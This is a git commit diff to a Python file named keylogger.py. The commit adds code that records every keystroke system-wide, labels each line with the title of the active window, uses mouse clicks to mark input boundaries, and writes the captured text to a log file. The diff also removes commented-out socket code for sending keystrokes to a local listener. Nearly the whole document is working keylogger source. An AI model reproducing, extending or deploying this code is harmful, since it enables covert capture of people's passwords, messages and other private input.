1ec73986d7951b8c6803c2afab4ec0b45a7b9447
anas lhichou <hichouanas@gmail.com>
2021-06-24 19:36:47 +0100

    added log file and window name

--- keylogger.py
+++ keylogger.py
@@ -1,28 +1,49 @@
 import pygetwindow as gw
 from pynput import keyboard
-import socket
+from pynput.mouse import Listener
+import logging
 
-print(gw.getActiveWindow().title)
-# HOST = 'localhost'
-# PORT = 4444
-# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-#     s.bind((HOST, PORT))
-#     s.listen()
-#     conn, addr = s.accept()
-#     print('Connected by', addr)
+win = None
+clicked = False
+line=''
+logging.basicConfig(filename='example.log', encoding='utf-8',format='%(asctime)s %(message)s',datefmt='%m/%d/%Y %I:%M:%S %p')
+def check_input_change(key):
+    global win
+    global clicked
+    global line
+    if win != gw.getActiveWindow().title or clicked or str(key) == 'Key.enter':
+        clicked = False
+        win = gw.getActiveWindow().title
+        print('\n')
+        print(f'{win} : ',sep=' ',end='',flush=True)
+        logging.warning(line)
+        line=f'[{win}] : '
 
 def on_press(key):
+    global line
     try:
-        # print(key.char,sep=' ',end='',flush=True)
-        print(f'{gw.getActiveWindow().title} : {key.char}')
-        # conn.send(key.char.encode())
+        check_input_change(key)
+        line+=key.char
+        print(f'{key.char}',sep=' ',end='',flush=True)
     except AttributeError:
-        # print(key)
-            pass
+        if str(key) == 'Key.space':
+            check_input_change(key)
+            print(' ',sep=' ',end='',flush=True)
+            line+=' '
     if str(key) == 'Key.esc':
+        logging.warning(line)
         exit()
 
 
+def on_click(x, y, button, pressed):
+    global clicked
+    clicked = True
+
+
     
-with keyboard.Listener(on_press=on_press) as listener :
+keyLis = keyboard.Listener(on_press=on_press)
+keyLis.start()
+
+
+with Listener(on_click=on_click) as listener:
     listener.join()
